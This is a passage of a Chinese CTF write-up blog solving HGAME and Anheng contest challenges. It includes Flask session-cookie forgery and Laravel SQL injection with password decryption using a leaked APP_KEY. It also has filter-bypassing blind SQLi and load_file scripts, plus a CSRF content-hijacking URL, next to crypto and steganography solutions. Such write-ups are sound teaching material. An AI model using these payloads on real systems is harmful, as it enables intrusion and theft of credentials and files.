9RxdzNwq7!nOoK3*</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;u&#39;csrf_token&#39;: u&#39;617545ff8175e64f9e5a9f540bea812dea2583d5&#39;, u&#39;_fresh&#39;: True, u&#39;user_id&#39;: u&#39;111&#39;, u&#39;_id&#39;: u&#39;051101fca32cbd279dfd6e96892ec55881e06fcb6a52872d04c920c74efacf9e245536486635b70ed6ecc6c446f0b431600fbaa9626a2089b2ca45ae7b8dc2eb&#39;&#125;</span><br></pre></td></tr></table></figure>\n<p>猜测user_id可能代表的是用户id，猜测admin的用户ID为1，修改一下id为1伪造cookie</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">python session_cookie_manager.py encode -s 9RxdzNwq7!nOoK3* -t &#123;&#39;csrf_token&#39;:&#39;617545ff8175e64f9e5a9f540bea812dea2583d5&#39;,&#39;_fresh&#39;:True,&#39;user_id&#39;:&#39;1&#39;,&#39;_id&#39;:&#39;0 51101fca32cbd279dfd6e96892ec55881e06fcb6a52872d04c920c74efacf9e245536486635b70ed6ecc6c446f0b431600fbaa9626a208 9b2ca45ae7b8dc2eb&#39;&#125;</span><br></pre></td></tr></table></figure>\n<p>然后将生成的cookie覆盖原来cookie即可得到flag</p>\n<p><img src=\"https://i.loli.net/2019/02/26/5c752b920389a.png\" alt></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">hgame&#123;Qu_bu_la1_m1ng_z1_14&#125;</span><br></pre></td></tr></table></figure>\n<p>ps: 这题我入了一个坑点，在伪造cookie的时候，命令行下老是报错<code>ValueError: dictionary update sequence element #0 has length 1; 2 is required</code>，查看了一下代码发现是在dict()函数处报错的</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))</span><br></pre></td></tr></table></figure>\n<p>但是同样的代码在linux下就可以正常运行，测试了一下发现在windows下dict的参数其实是类似于<code>{aa:aa}</code>，而linux下却是<code>{&#39;aa&#39;:&#39;aa&#39;}</code>，命令行输入是完全相同的，显然windows下的参数无法正确执行，经过研究发现是<code>&quot;</code>捣的鬼，在windows下我们输入的<code>&quot;</code>是不会被捕获的，只会捕获双引号里面的内容，而单引号不存在这个问题，如果想要输入双引号必须要反斜杠转义，举个例子</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">4</span>):</span><br><span class=\"line\">    print(sys.argv[i])</span><br></pre></td></tr></table></figure>\n<p>我们输入<code>python b.py &quot;key&quot;:&quot;value&quot; &#39;key&#39;:&#39;value&#39; \\&quot;\\&#39;</code>，此时输出为<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">b.py</span><br><span class=\"line\">key:value</span><br><span class=\"line\">&#39;key&#39;:&#39;value&#39;</span><br><span class=\"line\">&quot;\\&#39;</span><br></pre></td></tr></table></figure></p>\n<p>这就是区别，应该是windows特性的问题，自己被坑了好久还以为自己做的不对（泪奔~~~~~）</p>\n<h2 id=\"happyPHP\"><a href=\"#happyPHP\" class=\"headerlink\" title=\"happyPHP\"></a>happyPHP</h2><p>正常注册之后登录，查看源代码可以得到项目源代码<code>!--https://github.com/Lou00/laravel--&gt;</code></p>\n<p>审计代码时，一般应该从路由开始看起，看一共有哪些页面，实现了哪些功能，对于laraval来说，我们先从routes/web.php开始审计</p>\n<p><img src=\"https://i.loli.net/2019/02/27/5c75e272afb23.png\" alt></p>\n<p>可以看到实现的路由，例如对第一行来说，表示的意思就是将根目录发送给StaticPagesController控制器下的home方法进行解析，name方法用来命令路由，便于后期的维护。</p>\n<p>app中的文件是框架的核心控制部分，我们查看一下该部分看看，在SessionController.php中发现了问题</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (Auth::attempt($credentials)) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (Auth::user()-&gt;id ===<span class=\"number\">1</span>)&#123;</span><br><span class=\"line\">        session()-&gt;flash(<span class=\"string\">'info'</span>,<span class=\"string\">'flag :******'</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> redirect()-&gt;route(<span class=\"string\">'users.show'</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    $name = DB::select(<span class=\"string\">\"SELECT name FROM `users` WHERE `name`='\"</span>.Auth::user()-&gt;name.<span class=\"string\">\"'\"</span>);</span><br><span class=\"line\">    session()-&gt;flash(<span class=\"string\">'info'</span>, <span class=\"string\">'hello '</span>.$name[<span class=\"number\">0</span>]-&gt;name);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> redirect()-&gt;route(<span class=\"string\">'users.show'</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>可以看到此处存在sql语句，在laraval中有更加安全的sql查询方式，这儿显然存在问题的，存在sql注入问题，我们可以注册一个用户名为<code>&#39; union select group_concat(email,password) from users where id=1#</code>，然后登录即可获得该用户的email和密码（因为题目要求id=1的用户登录才可以得到flag），</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">admin@hgame.comeyJpdiI6InJuVnJxZkN2ZkpnbnZTVGk5ejdLTHc9PSIsInZhbHVlIjoiRWFSXC80ZmxkT0dQMUdcL2FESzhlOHUxQWxkbXhsK3lCM3Mra0JBYW9Qb2RzPSIsIm1hYyI6IjU2ZTJiMzNlY2QyODI4ZmU2ZjQxN2M3ZTk4ZTlhNTg4YzA5N2YwODM0OTllMGNjNzIzN2JjMjc3NDFlODI5YWYifQ&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>\n<p>密码是经过加密的，解密一下</p>\n<blockquote>\n<p>{“iv”:”rnVrqfCvfJgnvSTi9z7KLw==”,”value”:”EaR/4fldOGP1G/aDK8e8u1Aldmxl+yB3s+kBAaoPods=”,”mac”:”56e2b33ecd2828fe6f417c7e98e9a588c097f083499e0cc7237bc27741e829af”}</p>\n</blockquote>\n<p>查看配置文件可以发现使用了aes加密，但是key值不知道<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#39;key&#39; &#x3D;&gt; env(&#39;APP_KEY&#39;),</span><br><span class=\"line\">&#39;cipher&#39; &#x3D;&gt; &#39;AES-256-CBC&#39;,</span><br></pre></td></tr></table></figure></p>\n<p>回滚git版本找到key值</p>\n<blockquote>\n<p>APP_KEY=base64:9JiyApvLIBndWT69FUBJ8EQz6xXl5vBs7ofRDm9rogQ=</p>\n</blockquote>\n<p>接下来编写解密脚本<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Cipher <span class=\"keyword\">import</span> AES</span><br><span class=\"line\"></span><br><span class=\"line\">iv = <span class=\"string\">'rnVrqfCvfJgnvSTi9z7KLw=='</span></span><br><span class=\"line\">value = <span class=\"string\">'EaR\\/4fldOGP1G\\/aDK8e8u1Aldmxl+yB3s+kBAaoPods='</span></span><br><span class=\"line\">enc = <span class=\"string\">'9JiyApvLIBndWT69FUBJ8EQz6xXl5vBs7ofRDm9rogQ='</span></span><br><span class=\"line\">enc = base64.b64decode(enc)</span><br><span class=\"line\">iv = base64.b64decode(iv)</span><br><span class=\"line\">value = base64.b64decode(value)</span><br><span class=\"line\">cryptor = AES.new(enc,AES.MODE_CBC,iv)</span><br><span class=\"line\">con = cryptor.decrypt(value)</span><br><span class=\"line\"><span class=\"keyword\">print</span> con</span><br></pre></td></tr></table></figure></p>\n<p>可以得到密码为<code>9pqfPIer0Ir9UUfR</code>，登录即可得到flag</p>\n<p><img src=\"https://i.loli.net/2019/02/27/5c75f88d0fb45.png\" alt></p>\n<p><strong><em>Reference：</em></strong></p>\n<ol>\n<li><a href=\"https://xz.aliyun.com/t/3161\" target=\"_blank\" rel=\"noopener\">https://xz.aliyun.com/t/3161</a></li>\n<li><a href=\"https://zry.io/archives/183\" target=\"_blank\" rel=\"noopener\">https://zry.io/archives/183</a></li>\n</ol>\n","categories":["writeup"],"tags":["CTF"]},{"title":"安恒月赛复现集合","url":"/2020/09/13/month-race/","content":"<p>历史文章补发</p>\n<p>部分安恒月赛题目的复现记录</p>\n<a id=\"more\"></a>\n<h1 id=\"5月月赛\"><a href=\"#5月月赛\" class=\"headerlink\" title=\"5月月赛\"></a>5月月赛</h1><h2 id=\"crypto-amp-misc\"><a href=\"#crypto-amp-misc\" class=\"headerlink\" title=\"crypto&amp;misc\"></a>crypto&amp;misc</h2><p>地址:<a href=\"https://pan.baidu.com/s/1RB1w5wHuk8bnNShHGaqqVg\" target=\"_blank\" rel=\"noopener\">https://pan.baidu.com/s/1RB1w5wHuk8bnNShHGaqqVg</a>   提取码：259q</p>\n<h3 id=\"baby-writeup\"><a href=\"#baby-writeup\" class=\"headerlink\" title=\"baby_writeup\"></a>baby_writeup</h3><p>拿到题目先strings一下，发现有个flag{}字样，然后在IDA打开，ctrl+1查找string字符串，找到之后F5反编译一下，记得要找到函数入口，看到代码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">fgets(s, 17, stdin);</span><br><span class=\"line\">if ( strlen(s) !&#x3D; 16 )</span><br><span class=\"line\">exit(0);</span><br><span class=\"line\">sub_400756(s, &amp;v6);</span><br><span class=\"line\">for ( i &#x3D; 0; i &lt; strlen(v6); ++i )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">if ( byte_601100[(signed __int64)i] !&#x3D; v6[i] )</span><br><span class=\"line\">  exit(0);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">printf(&quot;Flag&#123;%s&#125;\\n&quot;, s);</span><br></pre></td></tr></table></figure>\n<p>可以看到题目是输入一个长度为16的字符串(因为字符串结尾还有一个结束符要占据一位)，然后经过校验之后输出，说明输入的原来就是flag，找到byte_601100内存中的内容，把16进制提取出来</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">6DAB1EEB88B9B6179B7ACB7E</span><br></pre></td></tr></table></figure>\n<p>猜测它要不是hex要不是base64，尝试一下发现是base64，转换之，需要先进行ascii2hex的转换，这个不理解为什么，然后运行即可得到flag</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">root@kali:~&#x2F;Desktop# .&#x2F;5aff787616ad1 </span><br><span class=\"line\">base64i5thebest+</span><br><span class=\"line\">Flag&#123;base64i5thebest+&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"RSA\"><a href=\"#RSA\" class=\"headerlink\" title=\"RSA\"></a>RSA</h3><p>这题真是佩服他们的搜索能力，原来还可以这么玩（2333.），打开代码发现是已知n,e求d获取flag</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">N = <span class=\"number\">101991809777553253470276751399264740131157682329252673501792154507006158434432009141995367241962525705950046253400188884658262496534706438791515071885860897552736656899566915731297225817250639873643376310103992170646906557242832893914902053581087502512787303322747780420210884852166586717636559058152544979471</span></span><br><span class=\"line\">e = <span class=\"number\">46731919563265721307105180410302518676676135509737992912625092976849075262192092549323082367518264378630543338219025744820916471913696072050291990620486581719410354385121760761374229374847695148230596005409978383369740305816082770283909611956355972181848077519920922059268376958811713365106925235218265173085</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> hashlib</span><br><span class=\"line\">flag = <span class=\"string\">\"flag&#123;\"</span> + hashlib.md5(hex(d)).hexdigest() + <span class=\"string\">\"&#125;\"</span></span><br></pre></td></tr></table></figure>\n<p>观察可知本体的e非常大，所以百度搜索 <code>rsa攻击e很大</code>  在第一条结果里面居然就找到思路！！本题是wiener-attack，还附上了github代码，直接copy下来用就可以了，可以得到d的值，代入上述代码中即可得到flag</p>\n<h3 id=\"洞拐洞拐洞洞拐\"><a href=\"#洞拐洞拐洞洞拐\" class=\"headerlink\" title=\"洞拐洞拐洞洞拐\"></a>洞拐洞拐洞洞拐</h3><p>打开图片放大观察发现每一个小像素都是或黑或白的小方块,所以可以把黑色看成1白色看成0转换一下</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> PIL <span class=\"keyword\">import</span> Image</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\"></span><br><span class=\"line\">im = Image.open(<span class=\"string\">'5aff787f5d6f2.png'</span>)</span><br><span class=\"line\">pix = im.load()</span><br><span class=\"line\">width = im.size[<span class=\"number\">0</span>]</span><br><span class=\"line\">height = im.size[<span class=\"number\">1</span>]</span><br><span class=\"line\">flag = <span class=\"string\">''</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> range(width):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> y <span class=\"keyword\">in</span> range(height):</span><br><span class=\"line\">        r,g,b = pix[x,y]</span><br><span class=\"line\">        <span class=\"keyword\">if</span> r == <span class=\"number\">255</span>:</span><br><span class=\"line\">            flag += <span class=\"string\">'0'</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            flag += <span class=\"string\">'1'</span></span><br><span class=\"line\">content = re.findall(<span class=\"string\">r'.&#123;8&#125;'</span>,flag)</span><br><span class=\"line\">nflag = <span class=\"string\">''</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> item <span class=\"keyword\">in</span> content:</span><br><span class=\"line\">    nflag += chr(int(item,<span class=\"number\">2</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">flag = base64.b16decode(nflag)</span><br><span class=\"line\">open(<span class=\"string\">'1.wav'</span>,<span class=\"string\">'wb'</span>).write(flag)</span><br></pre></td></tr></table></figure>\n<p>处理wav文件，可以用一个Audacity工具，网上有在线版，分析文件，发现文件波形长度应该是八进制文件，分析一下</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> wave</span><br><span class=\"line\"><span class=\"keyword\">import</span> numpy <span class=\"keyword\">as</span> np</span><br><span class=\"line\"><span class=\"keyword\">import</span> re </span><br><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\"></span><br><span class=\"line\">file = <span class=\"string\">'1.wav'</span></span><br><span class=\"line\">wavefile = wave.open(file,<span class=\"string\">'r'</span>)</span><br><span class=\"line\">numframes = wavefile.getnframes()</span><br><span class=\"line\">strdata = wavefile.readframes(numframes)</span><br><span class=\"line\">wavedata = np.fromstring(strdata,dtype=np.int16)</span><br><span class=\"line\">wavedata = wavedata * <span class=\"number\">1.0</span> / (max(abs(wavedata)))</span><br><span class=\"line\">datas = []</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">0</span>,len(wavedata),<span class=\"number\">10</span>):</span><br><span class=\"line\">    datas.append(wavedata[i])</span><br><span class=\"line\"></span><br><span class=\"line\">strs = <span class=\"string\">''</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> data <span class=\"keyword\">in</span> datas:</span><br><span class=\"line\">    x = <span class=\"string\">\"%0.2f\"</span> % data</span><br><span class=\"line\">    strs += str(int((float(x) + <span class=\"number\">1.0</span>)/<span class=\"number\">0.25</span>) - <span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">tt = re.findall(<span class=\"string\">r'.&#123;3&#125;'</span>,strs)</span><br><span class=\"line\">flag = <span class=\"string\">''</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> t <span class=\"keyword\">in</span> tt:</span><br><span class=\"line\">    flag += chr(int(t,<span class=\"number\">8</span>))</span><br><span class=\"line\"><span class=\"comment\"># print flag</span></span><br><span class=\"line\"><span class=\"keyword\">print</span> base64.b32decode(flag+<span class=\"string\">\"======\"</span>)</span><br></pre></td></tr></table></figure>\n<p>处理一下就可以得到flag，这题真的是头铁，还是我太菜了。。</p>\n<h1 id=\"7月月赛\"><a href=\"#7月月赛\" class=\"headerlink\" title=\"7月月赛\"></a>7月月赛</h1><h2 id=\"web\"><a href=\"#web\" class=\"headerlink\" title=\"web\"></a>web</h2><h3 id=\"web02-就是这么直接\"><a href=\"#web02-就是这么直接\" class=\"headerlink\" title=\"web02 就是这么直接\"></a>web02 就是这么直接</h3><p>这题目我觉得就是脑洞题，题目给出了提示代码，其中有md5函数，可能是提示我们本题和md5有关，其实本题思路就是先提交一个md5值，题目会返回 <code>emmm我觉得答案是啥呢？</code> 查看元素可以看到后面还加了一串md5值，将这段md5再次提交，重复这个过程，直到得到flag，代码如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"></span><br><span class=\"line\">url =  <span class=\"string\">'http://101.71.29.5:10002/flag.php'</span></span><br><span class=\"line\">payload = &#123;<span class=\"string\">'answer'</span>:<span class=\"string\">'c36af63f87acebba1c23498809db7537'</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">    content = requests.post(url,payload).content.decode(<span class=\"string\">'utf-8'</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"string\">'flag'</span> <span class=\"keyword\">in</span> content:</span><br><span class=\"line\">        print(content)</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\">    new = re.findall(<span class=\"string\">'&lt;!--[0-9a-z]&#123;10,&#125;--&gt;'</span>,content)</span><br><span class=\"line\">    payload = &#123;<span class=\"string\">'answer'</span>: new[<span class=\"number\">0</span>][<span class=\"number\">4</span>:<span class=\"number\">-3</span>]&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"web03-简历来了\"><a href=\"#web03-简历来了\" class=\"headerlink\" title=\"web03 简历来了\"></a>web03 简历来了</h3><p>这个题目考察的是CSRF相关的知识点</p>\n<p>/upload/73e0669ac68ffcb28aed0c48b0924a42.jpg<br><a href=\"http://138.68.29.92:8888/ContentHijackingLoader.html?objfile=http://127.0.0.1/upload/73e0669ac68ffcb28aed0c48b0924a42.jpg&amp;objtype=flash&amp;target=http://127.0.0.1/admin&amp;postdata=&amp;logmode=result&amp;regex=&amp;isauto=1\">http://138.68.29.92:8888/ContentHijackingLoader.html?objfile=http://127.0.0.1/upload/73e0669ac68ffcb28aed0c48b0924a42.jpg&amp;objtype=flash&amp;target=http://127.0.0.1/admin&amp;postdata=&amp;logmode=result&amp;regex=&amp;isauto=1</a></p>\n<h2 id=\"MISC\"><a href=\"#MISC\" class=\"headerlink\" title=\"MISC\"></a>MISC</h2><p>链接：<a href=\"https://pan.baidu.com/s/1kqOTuqtJsW6PK4ob2_VqNg\" target=\"_blank\" rel=\"noopener\">https://pan.baidu.com/s/1kqOTuqtJsW6PK4ob2_VqNg</a>   密码：m97g</p>\n<h3 id=\"0x01-弱口令\"><a href=\"#0x01-弱口令\" class=\"headerlink\" title=\"0x01-弱口令\"></a>0x01-弱口令</h3><p>这题比较坑，题目是个压缩包，解压需要密码，打开压缩包之后发现有一段不可见文本，复制一下在sublime中打开发现是摩斯密码，解密一下 <code>HELL0FORUM</code> ，解压这个压缩包，发现一张图片，一道基本的LSB色道隐写，用脚本跑一下即可</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">python lsb.py extract aa.png 1.txt 123456</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><figcaption><span>是弱口令</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">### 0X02-浏览图片的时候刷新键有没有用呢 </span><br><span class=\"line\"></span><br><span class=\"line\">由刷新可以联想到这题考察的是F5算法，网上查找解密算法</span><br></pre></td></tr></table></figure>\n<p>java Extract Misc.jpg<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">可以得到一个文本文件，看文件前缀发现是zip文件前缀，修改文件后缀为zip即可，zip文件还有一层伪加密，之后解密即可得到flag</span><br><span class=\"line\"></span><br><span class=\"line\">### 0x03-到底为了什么</span><br></pre></td></tr></table></figure><br>http.request.uri contains “pma”<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">[](month_race&#x2F;1.png)</span><br><span class=\"line\"></span><br><span class=\"line\">可以看到有一条修改密码的命令，继续浏览发现应该是一个csrf攻击的流量包，网上查找cve编号</span><br><span class=\"line\"></span><br><span class=\"line\">[](month_race&#x2F;2.png)</span><br><span class=\"line\"></span><br><span class=\"line\">计算flag</span><br><span class=\"line\"></span><br><span class=\"line\">&#96;&#96;&#96;php</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">$con &#x3D; strtolower(&quot;CVE-2017-1000499_CWE-352_2018-06-15 09:40:12&quot;);</span><br><span class=\"line\">echo md5($con);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"十月月赛\"><a href=\"#十月月赛\" class=\"headerlink\" title=\"十月月赛\"></a>十月月赛</h1><h2 id=\"web-1\"><a href=\"#web-1\" class=\"headerlink\" title=\"web\"></a>web</h2><h3 id=\"好黑的黑名单\"><a href=\"#好黑的黑名单\" class=\"headerlink\" title=\"好黑的黑名单\"></a>好黑的黑名单</h3><p>随便测试可以发现数据库名长度为3</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;101.71.29.5:10008&#x2F;show.php?id&#x3D;0||if((length(database())-3),1,0)</span><br></pre></td></tr></table></figure>\n<p>题目过滤了分号，单引号，但是regexp没有被过滤，可以使用regexp来绕过，可知数据库名为web</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;101.71.29.5:10008&#x2F;show.php?id&#x3D;if((database()regexp(0x776562)),1,2)</span><br></pre></td></tr></table></figure>\n<p>然后爆库名，但是=号被过滤了，但是可以用in来绕过，比如这样</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"number\">1</span> <span class=\"keyword\">in</span> (<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>)</span><br></pre></td></tr></table></figure>\n<p>空格也被过滤了，可以用%0a绕过，还有information.schema.tables也被过滤了，可以用information_schema%0a.%0atables来绕过，代码如下</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">url = <span class=\"string\">\"http://101.71.29.5:10008/show.php?id=\"</span></span><br><span class=\"line\">test = <span class=\"string\">\"0123456789qwertyuiopasdfghjklzxcvbnm,\\&#123;|\\&#125;~\"</span></span><br><span class=\"line\">table = <span class=\"string\">\"if(((select%0agroup_concat(table_name)%0afrom%0ainformation_schema%0a.%0atables%0awhere%0atable_schema%0ain%0a(database()))regexp(0x&#123;&#125;)),1,2)\"</span></span><br><span class=\"line\"><span class=\"comment\"># table_name:admin,flaggg,menu</span></span><br><span class=\"line\">column = <span class=\"string\">\"if(((select%0agroup_concat(column_name)%0afrom%0ainformation_schema%0a.%0acolumns%0awhere%0atable_name%0ain%0a(0x666c61676767))regexp(0x&#123;&#125;)),1,2)\"</span></span><br><span class=\"line\"><span class=\"comment\"># id,f1agg</span></span><br><span class=\"line\">content = <span class=\"string\">\"if(((select%0af1agg%0afrom%0aflaggg)regexp(0x&#123;&#125;)),1,2)\"</span></span><br><span class=\"line\">payload = <span class=\"string\">\"5e\"</span></span><br><span class=\"line\">flag = <span class=\"string\">\"\"</span></span><br><span class=\"line\">flagdic = <span class=\"string\">\"0123456789abcdeflag.\"</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">50</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> s <span class=\"keyword\">in</span> flagdic:</span><br><span class=\"line\">        temp = hex(ord(s))[<span class=\"number\">2</span>:<span class=\"number\">4</span>]</span><br><span class=\"line\">        <span class=\"comment\"># print(url+table.format(payload+temp))</span></span><br><span class=\"line\">        res = requests.get(url+content.format(payload+temp)).text</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">\"郑州烩面\"</span> <span class=\"keyword\">in</span> res:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> temp == <span class=\"string\">\"7b\"</span>:</span><br><span class=\"line\">                payload += <span class=\"string\">\"2e\"</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                payload += temp;</span><br><span class=\"line\">            flag += chr(int(temp,<span class=\"number\">16</span>))</span><br><span class=\"line\">            print(payload)</span><br><span class=\"line\">            print(flag)</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"string\">\"油泼面\"</span> <span class=\"keyword\">in</span> res:</span><br><span class=\"line\">            <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"error\"</span>)</span><br></pre></td></tr></table></figure>\n<p>看了学长的博客说regexp在匹配flag的时候只能到flag{之后就会报错，这是由于正则表达式中{}是有特殊含义的，所以会报错，我们用 <code>.</code> 来代替{}就可以了</p>\n<p><img src=\"/2020/09/13/month-race/10.png\" alt></p>\n<h3 id=\"ezsql\"><a href=\"#ezsql\" class=\"headerlink\" title=\"ezsql\"></a>ezsql</h3><p>注入题目，注册账号登录进去查看用户信息时id参数存在注入，需要用到load_file函数，wp里面用了if函数，但是这题我使用的异或运算符^</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">dic = <span class=\"string\">\"0123456789ABCDEF\"</span></span><br><span class=\"line\">url = <span class=\"string\">\"http://101.71.29.5:10015/user/user.php?id=\"</span></span><br><span class=\"line\">file = open(<span class=\"string\">'1.txt'</span>,<span class=\"string\">'w'</span>)</span><br><span class=\"line\">cookie = &#123;<span class=\"string\">\"PHPSESSID\"</span>: <span class=\"string\">\"8lvl1ukppvqs2ovi8n0a2lu4g5\"</span>&#125;</span><br><span class=\"line\"><span class=\"comment\"># index.php</span></span><br><span class=\"line\">index = <span class=\"string\">\"0^(hex(load_file(0x2f7661722f7777772f68746d6c2f696e6465782e706870)) like 0x&#123;&#125;25)\"</span> </span><br><span class=\"line\">config = <span class=\"string\">\"0^(hex(load_file(0x2f7661722f7777772f68746d6c2f636f6e6669672f636f6e6669672e706870)) like 0x&#123;&#125;25)\"</span> </span><br><span class=\"line\">payload = <span class=\"string\">\"\"</span></span><br><span class=\"line\">content = <span class=\"string\">\"\"</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">10000</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> item <span class=\"keyword\">in</span> dic:</span><br><span class=\"line\">        temp = hex(ord(item))[<span class=\"number\">2</span>:<span class=\"number\">4</span>]</span><br><span class=\"line\">        <span class=\"comment\"># print(url+index.format(payload+temp))</span></span><br><span class=\"line\">        res = requests.get(url+config.format(payload+temp),cookies=cookie).text</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">\"admin\"</span> <span class=\"keyword\">in</span> res:</span><br><span class=\"line\">            payload += temp</span><br><span class=\"line\">            content += item</span><br><span class=\"line\">            file.writelines(payload)</span><br><span class=\"line\">            file.writelines(content)</span><br><span class=\"line\">            print(payload)</span><br><span class=\"line\">            print(content)</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br></pre></td></tr></table></figure>\n<p>可以得到index.php的代码为</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\"><span class=\"keyword\">require_once</span>(<span class=\"string\">'config/sys_config.php'</span>);</span><br><span class=\"line\"><span class=\"keyword\">require_once</span>(<span class=\"string\">'header.php'</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($_COOKIE[<span class=\"string\">'CONFIG'</span>]))&#123;</span><br><span class=\"line\">    $config = $_COOKIE[<span class=\"string\">'CONFIG'</span>];</span><br><span class=\"line\">    <span class=\"keyword\">require_once</span>(<span class=\"string\">'config/config.php'</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>再读config.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$config = unserialize(base64_decode($config));</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'p'</span>]))&#123;</span><br><span class=\"line\">    $p=$_GET[<span class=\"string\">'p'</span>];    </span><br><span class=\"line\">    $config-&gt;$p;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Config</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> $config;</span><br><span class=\"line\">    <span 